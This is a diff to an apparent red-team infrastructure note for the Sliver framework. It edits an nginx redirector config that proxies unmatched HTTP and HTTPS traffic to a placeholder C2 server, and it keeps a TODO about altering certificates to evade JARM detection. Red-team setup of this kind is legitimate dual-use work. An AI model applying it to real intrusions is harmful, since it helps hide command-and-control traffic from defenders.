@@ -2,7 +2,7 @@
 
 Search Tag: #red-team-infrastructure #sliver
 
-TODO: Modify certificates to evade JARM detection
+TODO: Modify certificates to evade JARM detection if possible
 
 ```
 $ sudo ls -l /root/.sliver/certs
@@ -152,10 +152,14 @@ sudo service apache2 restart
 ```
 server {
     listen 80;
-    # server_name your_ip_address_here;
+    # server_name < _ | C2_IP >;
     server_name _;
 
     location / {
+        try_files $uri $uri/ @c2;
+    }
+
+    location @c2 {
         proxy_pass http://<C2_IP>:<C2_PORT>/;
         proxy_set_header Host $host;
         proxy_set_header X-Real-IP $remote_addr;
@@ -166,13 +170,18 @@ server {
 
 server {
     listen 443 ssl;
-    # server_name your_ip_address_here;
+    listen [::]:443 ssl http2;
+    # server_name < _ | C2_IP >;
     server_name _;
 
     ssl_certificate /etc/nginx/ssl/nginx.crt;
     ssl_certificate_key /etc/nginx/ssl/nginx.key;
 
     location / {
+        try_files $uri $uri/ @c2;
+    }
+
+    location @c2 {
         proxy_pass http://<C2_IP>:<C2_PORT>/;
         proxy_set_header Host $host;
         proxy_set_header X-Real-IP $remote_addr;
